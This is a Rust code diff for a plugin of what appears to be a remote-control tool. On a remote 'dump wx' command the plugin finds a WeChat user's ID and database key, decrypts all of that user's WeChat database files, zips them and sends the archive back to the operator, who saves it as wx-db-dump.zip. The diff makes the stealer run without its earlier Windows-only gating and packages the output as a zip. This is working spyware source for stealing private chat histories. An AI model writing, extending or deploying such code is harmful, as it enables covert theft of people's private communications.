@@ -1,7 +1,12 @@
-use yizhan_plugin::Plugin;
-use yizhan_protocol::command::{UserCommand, UserCommandResult};
+use std::io::{Cursor, Write};
 
-#[cfg(windows)]
+use dump::{decrypt_wechat_db_file, WeChatPrivateInfo, WxDbFiles};
+use tracing::{info, warn};
+use yizhan_bootstrap::get_program_dir;
+use yizhan_plugin::Plugin;
+use yizhan_protocol::command::{UserCommand, UserCommandResponse, UserCommandResult};
+use zip::ZipWriter;
+
 mod dump;
 
 #[derive(Default)]
@@ -22,11 +27,7 @@ impl Plugin for YiZhanDumpWxPlugin {
         }
     }
 
-    #[cfg(windows)]
     fn execute_command(&self, group_id: &str, content: &str) -> Option<UserCommandResult> {
-        use tracing::{info, warn};
-        use yizhan_protocol::command::UserCommandResponse;
-
         match (group_id, content) {
             ("dump", "wx") => {
                 info!("Finding wechat info ...");
@@ -54,7 +55,7 @@ impl Plugin for YiZhanDumpWxPlugin {
                     Ok(result) => UserCommandResult::Ok(UserCommandResponse::PluginBinaryCommand(
                         "dump".to_string(),
                         "db".to_string(),
-                        bincode::encode_to_vec(&result, bincode::config::standard()).unwrap(),
+                        result,
                     )),
                     Err(err) => {
                         UserCommandResult::Err(format!("find wechat info error: {:?}", err))
@@ -65,53 +66,45 @@ impl Plugin for YiZhanDumpWxPlugin {
         }
     }
 
-    #[cfg(not(windows))]
-    fn execute_command(&self, _group_id: &str, _content: &str) -> Option<UserCommandResult> {
-        None
-    }
-
-    #[cfg(windows)]
     fn show_response(
         &self,
         response: &yizhan_protocol::command::UserCommandResponse,
     ) -> Option<String> {
-        use yizhan_protocol::command::UserCommandResponse;
-
-        use crate::dump::DecryptedDbFile;
-
         match response {
             UserCommandResponse::PluginBinaryCommand(group_id, cmd, bytes)
                 if group_id == "dump" && cmd == "db" =>
             {
-                let info: Vec<DecryptedDbFile> =
-                    bincode::decode_from_slice(bytes.as_slice(), bincode::config::standard())
-                        .ok()?
-                        .0;
-                Some(format!("decrypted file count: {:?}", info.len()))
+                let mut db_file = get_program_dir().ok()?;
+                db_file.push("wx-db-dump.zip");
+
+                std::fs::write(&db_file, bytes).ok()?;
+                Some(format!(
+                    "decrypted file at: {:?}",
+                    db_file.to_str().unwrap_or_default()
+                ))
             }
             _ => None,
         }
     }
 }
 
-#[cfg(windows)]
-fn dump_wx_db() -> anyhow::Result<Vec<dump::DecryptedDbFile>> {
-    use crate::dump::{decrypt_wechat_db_file, DecryptedDbFile, WeChatPrivateInfo, WxDbFiles};
-
-    let mut result = Vec::new();
+fn dump_wx_db() -> anyhow::Result<Vec<u8>> {
+    let mut buffer = Vec::new();
+    let cursor = Cursor::new(&mut buffer);
+    let mut zip = ZipWriter::new(cursor);
 
     let WeChatPrivateInfo { wxid, key, .. } = dump::auto_find_wechat_info()?;
     let dir = WxDbFiles::new(&wxid)?;
     for db_file in dir {
         let db_file = db_file?;
         let content = decrypt_wechat_db_file(&key, std::fs::read(db_file.path)?.as_slice())?;
-        let info = DecryptedDbFile {
-            bytes: content,
-            file_name: db_file.file_name,
-            index: db_file.index,
-        };
-        result.push(info);
+
+        zip.start_file(db_file.file_name, Default::default())?;
+        zip.write_all(&content)?;
     }
 
-    Ok(result)
+    zip.finish()?;
+    drop(zip);
+
+    Ok(buffer)
 }
